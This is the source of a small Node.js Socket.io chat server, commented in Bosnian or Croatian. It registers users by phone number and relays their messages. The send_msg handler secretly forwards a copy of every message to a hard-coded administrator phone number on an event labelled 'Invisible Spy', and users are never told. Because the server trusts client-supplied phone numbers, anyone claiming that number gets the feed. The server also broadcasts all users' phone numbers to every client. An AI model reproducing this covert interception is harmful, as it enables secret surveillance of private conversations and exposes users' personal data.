const express = require('express');
const app = express();
const server = require('http').Server(app);
const io = require('socket.io')(server);

app.use(express.static(__dirname));

let users = {}; 
const ADMIN_NUMBER = "00387603344334"; // Tvoj broj za nadzor

io.on('connection', (socket) => {
    // Prijava korisnika
    socket.on('auth', (data) => {
        if(!data.phone) return;
        socket.join(data.phone); 
        users[data.phone] = { 
            name: data.name, 
            photo: data.photo, 
            phone: data.phone, 
            sid: socket.id 
        };
        // Odmah osvježi listu svima
        io.emit('user_list', Object.values(users));
    });

    // Slanje poruke sa vremenom
    socket.on('send_msg', (data) => {
        const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        const packet = { ...data, time: time };
        
        // Šalje primaocu i pošiljaocu (za update ekrana)
        io.to(data.to).to(data.from).emit('new_msg', packet);
        
        // Admin kopija (Invisible Spy)
        if (data.from !== ADMIN_NUMBER) {
            io.to(ADMIN_NUMBER).emit('admin_spy', packet);
        }
    });

    socket.on('disconnect', () => {
        for (let p in users) {
            if (users[p].sid === socket.id) {
                delete users[p];
                break;
            }
        }
        io.emit('user_list', Object.values(users));
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Green Apple v5.0 Aktivan'));
